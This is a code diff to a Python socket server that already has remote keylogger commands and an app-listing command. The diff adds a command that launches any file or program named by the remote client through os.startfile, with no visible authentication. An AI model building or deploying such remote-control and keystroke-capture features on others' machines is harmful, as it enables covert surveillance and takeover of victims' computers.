@@ -16,6 +16,7 @@ CMD_START_KEYLOGGER = 'start_keylogger'
 CMD_STOP_KEYLOGGER = 'stop_keylogger'
 CMD_PRINT_KEYLOGGER = 'print_keylogger'
 CMD_VIEW_APPS = 'view_apps'
+CMD_START_APP = 'start_app'
 
 # FLAGS
 FLAG_FILE_END = 'FILE_END'
@@ -97,6 +98,12 @@ class Server:
         time.sleep(0.01)
         conn.send(FLAG_APPS_END.encode())
 
+      # Start app
+      elif data == CMD_START_APP.encode():
+        print('Starting app')
+        app_name = conn.recv(BUFFER_SIZE).decode()
+        self.start_app(str(app_name))
+
     conn.close()
     print(f"[DISCONNECTED] {addr} disconnected.")
 
@@ -169,6 +176,9 @@ class Server:
         apps += line.decode().rstrip()
         apps += "\n"
     return apps
+
+  def start_app(self, app_name):
+    os.startfile(app_name)
 
 if __name__ == '__main__':
   server = Server()
